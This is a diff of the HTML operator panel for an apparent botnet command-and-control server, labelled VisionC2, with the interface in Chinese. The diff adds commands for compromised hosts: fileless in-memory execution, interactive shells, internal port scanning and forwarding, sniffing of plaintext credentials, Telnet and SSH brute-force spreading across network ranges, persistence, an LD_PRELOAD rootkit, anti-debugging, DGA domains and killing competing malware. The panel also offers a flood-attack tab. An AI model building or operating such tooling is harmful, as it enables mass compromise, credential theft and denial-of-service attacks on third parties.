@@ -85,14 +85,29 @@
             </div>
             <div class="cmd-panel-body" id="cmd-inline">
                 <select id="cmd-type" onchange="updateArgFields()">
-                    <option value="!shell" data-cat="exec">!shell</option>
-                    <option value="!detach" data-cat="exec">!detach</option>
-                    <option value="!socks" data-cat="network">!socks</option>
-                    <option value="!stopsocks" data-cat="network">!stopsocks</option>
-                    <option value="!socksauth" data-cat="network">!socksauth</option>
-                    <option value="!persist" data-cat="mgmt">!persist</option>
-                    <option value="!reinstall" data-cat="mgmt">!reinstall</option>
-                    <option value="!lolnogtfo" data-cat="mgmt">!kill (销毁)</option>
+                    <option value="!shell" data-cat="exec">!shell (系统 Shell)</option>
+                    <option value="!ptyshell" data-cat="exec">!ptyshell (PTY 交互终端)</option>
+                    <option value="!detach" data-cat="exec">!detach (后台运行)</option>
+                    <option value="!memexec" data-cat="exec">!memexec (URL 内存无文件执行)</option>
+                    <option value="!memexecb64" data-cat="exec">!memexecb64 (Base64 内存执行)</option>
+                    <option value="!socks" data-cat="network">!socks (SOCKS5 代理)</option>
+                    <option value="!stopsocks" data-cat="network">!stopsocks (停止代理)</option>
+                    <option value="!socksauth" data-cat="network">!socksauth (代理认证设置)</option>
+                    <option value="!portscan" data-cat="network">!portscan (内网端口扫描)</option>
+                    <option value="!portfwd" data-cat="network">!portfwd (TCP 端口转发)</option>
+                    <option value="!stopportfwd" data-cat="network">!stopportfwd (停止端口转发)</option>
+                    <option value="!listfwd" data-cat="network">!listfwd (查看转发列表)</option>
+                    <option value="!sniffer" data-cat="network">!sniffer (原始数据包嗅探)</option>
+                    <option value="!telnet_scan" data-cat="network">!telnet_scan (Telnet 扫描爆破)</option>
+                    <option value="!ssh_scan" data-cat="network">!ssh_scan (SSH 扫描爆破)</option>
+                    <option value="!stop_scan" data-cat="network">!stop_scan (停止爆破扫描)</option>
+                    <option value="!persist" data-cat="mgmt">!persist (多重自启持久化)</option>
+                    <option value="!killer" data-cat="mgmt">!killer (竞品进程杀手)</option>
+                    <option value="!rootkit" data-cat="mgmt">!rootkit (LD_PRELOAD Rootkit)</option>
+                    <option value="!antidbg" data-cat="mgmt">!antidbg (反调试自检)</option>
+                    <option value="!dga" data-cat="mgmt">!dga (DGA 每日域名计算)</option>
+                    <option value="!reinstall" data-cat="mgmt">!reinstall (重装更新)</option>
+                    <option value="!lolnogtfo" data-cat="mgmt">!kill (彻底销毁)</option>
                 </select>
                 <div id="arg-fields" class="cmd-args"></div>
                 <div class="cmd-target-wrap">
@@ -111,12 +126,14 @@
                     id="tab-bots-count">0</span></button>
             <button class="tab" data-tab="tab-socks" onclick="switchTab(this);loadRelayStats()" data-tooltip="活动的 SOCKS5 代理及中继健康状态">SOCKS <span class="tab-count"
                     id="tab-socks-count">0</span></button>
+            <button class="tab" data-tab="tab-scanners" onclick="switchTab(this)" data-tooltip="端口扫描、爆破扫描器与网络嗅探控制">扫描与工具</button>
             <button class="tab" data-tab="tab-attack" onclick="switchTab(this)" data-tooltip="对目标发起 L4/L7 泛洪攻击">攻击</button>
             <button class="tab" data-tab="tab-activity" onclick="switchTab(this)" data-tooltip="实时事件日志 — 连接、断开、命令">活动</button>
             <button class="tab" data-tab="tab-tasks" onclick="switchTab(this);loadTasks()" data-tooltip="按计划的 Cron 间隔定期发送循环命令">任务 <span class="tab-count"
                     id="tab-tasks-count">0</span></button>
             <button class="tab" data-tab="tab-users" onclick="switchTab(this);loadUsers()" data-tooltip="管理操作员账户和权限级别">用户</button>
         </div>
+
 
         <!-- Tab: Bots -->
         <div class="tab-panel active" id="tab-bots">
@@ -430,58 +447,86 @@
             </div>
         </div>
 
-        <!-- Tab: Scanners (removed — not in VisionC2) -->
-        <div class="tab-panel" id="tab-scanners" style="display:none!important">
+        <!-- Tab: Scanners & Tools -->
+        <div class="tab-panel" id="tab-scanners">
             <div class="users-toolbar" style="margin-bottom:12px">
-                <span style="color:var(--text-dim);font-size:13px">在所有受控端上启动或停止扫描器。Telnet 扫描器需要指定一个扫描服务器地址。</span>
+                <span style="color:var(--text-dim);font-size:13px">受控端网段扫描、爆破扫描器、端口转发及数据包嗅探模块控制。</span>
             </div>
             <div class="scanner-grid">
                 <!-- Telnet Scanner -->
                 <div class="scanner-card">
                     <div class="scanner-card-header">
-                        <span class="scanner-card-title">Telnet 扫描器</span>
-                        <span class="scanner-card-desc">暴力破解 Telnet 凭证并传播感染至新设备</span>
+                        <span class="scanner-card-title">Telnet 爆破扫描器</span>
+                        <span class="scanner-card-desc">针对指定 CIDR 网段并发爆破 Telnet (23) 凭据并上报 Hits</span>
                     </div>
                     <div class="scanner-card-body">
                         <div class="cmd-group" style="margin-bottom:10px">
-                            <label>扫描服务器</label>
-                            <input type="text" id="scan-telnet-addr" placeholder="主机:端口 (例如 1.2.3.4:48290)"
+                            <label>目标 CIDR</label>
+                            <input type="text" id="scan-telnet-cidr" placeholder="如 192.168.1.0/24"
                                 class="cmd-target" style="width:100%">
                         </div>
                         <div class="scanner-card-actions">
-                            <button class="ms-btn" onclick="scannerStart('telnet')">全部启动</button>
-                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('telnet')">全部停止</button>
+                            <button class="ms-btn" onclick="startScannerCmd('!telnet_scan', 'scan-telnet-cidr')">全部启动</button>
+                            <button class="ms-btn ms-btn-danger" onclick="stopScannerCmd()">全部停止</button>
                         </div>
                     </div>
                 </div>
-                <!-- TR-064 Scanner -->
+                <!-- SSH Scanner -->
                 <div class="scanner-card">
                     <div class="scanner-card-header">
-                        <span class="scanner-card-title">TR-064 扫描器</span>
-                        <span class="scanner-card-desc">在存在漏洞的路由器上利用 TR-064 (CPE WAN 管理) 协议</span>
+                        <span class="scanner-card-title">SSH 爆破扫描器</span>
+                        <span class="scanner-card-desc">针对指定 CIDR 网段并发爆破 SSH (22) 凭据并验证命令能力</span>
                     </div>
                     <div class="scanner-card-body">
+                        <div class="cmd-group" style="margin-bottom:10px">
+                            <label>目标 CIDR</label>
+                            <input type="text" id="scan-ssh-cidr" placeholder="如 10.0.0.0/24"
+                                class="cmd-target" style="width:100%">
+                        </div>
                         <div class="scanner-card-actions">
-                            <button class="ms-btn" onclick="scannerStart('tr064')">全部启动</button>
-                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('tr064')">全部停止</button>
+                            <button class="ms-btn" onclick="startScannerCmd('!ssh_scan', 'scan-ssh-cidr')">全部启动</button>
+                            <button class="ms-btn ms-btn-danger" onclick="stopScannerCmd()">全部停止</button>
                         </div>
                     </div>
                 </div>
-                <!-- HNAP Scanner -->
+                <!-- Port Scanner -->
                 <div class="scanner-card">
                     <div class="scanner-card-header">
-                        <span class="scanner-card-title">HNAP 扫描器</span>
-                        <span class="scanner-card-desc">在存在漏洞的路由器上利用 HNAP (家庭网络管理) 协议</span>
+                        <span class="scanner-card-title">内网端口扫描器</span>
+                        <span class="scanner-card-desc">并发扫描目标主机或网段的开放 TCP 端口 (如 22,80,443,3389)</span>
                     </div>
                     <div class="scanner-card-body">
+                        <div class="cmd-group" style="margin-bottom:10px">
+                            <label>目标 IP / CIDR</label>
+                            <input type="text" id="scan-ps-target" placeholder="192.168.1.1 或 192.168.1.0/24" class="cmd-target" style="width:100%">
+                        </div>
+                        <div class="cmd-group" style="margin-bottom:10px">
+                            <label>端口范围</label>
+                            <input type="text" id="scan-ps-ports" placeholder="22,80,443,100-200" value="22,80,443,3389,8080" class="cmd-target" style="width:100%">
+                        </div>
                         <div class="scanner-card-actions">
-                            <button class="ms-btn" onclick="scannerStart('hnap')">全部启动</button>
-                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('hnap')">全部停止</button>
+                            <button class="ms-btn" onclick="startPortScanCmd()">开始扫描</button>
+                            <button class="ms-btn ms-btn-danger" onclick="sendBroadCmd('!stopscan')">停止扫描</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Network Sniffer -->
+                <div class="scanner-card">
+                    <div class="scanner-card-header">
+                        <span class="scanner-card-title">数据包嗅探器 (Sniffer)</span>
+                        <span class="scanner-card-desc">捕抓受控端网卡明文传输凭据 (FTP, HTTP Basic 认证等)</span>
+                    </div>
+                    <div class="scanner-card-body">
+                        <div class="scanner-card-actions" style="margin-top:12px">
+                            <button class="ms-btn" onclick="sendBroadCmd('!sniffer start')">启动嗅探</button>
+                            <button class="ms-btn" onclick="sendBroadCmd('!sniffer dump')">导出抓取结果</button>
+                            <button class="ms-btn ms-btn-danger" onclick="sendBroadCmd('!sniffer stop')">停止嗅探</button>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
+
 
     </div>
 
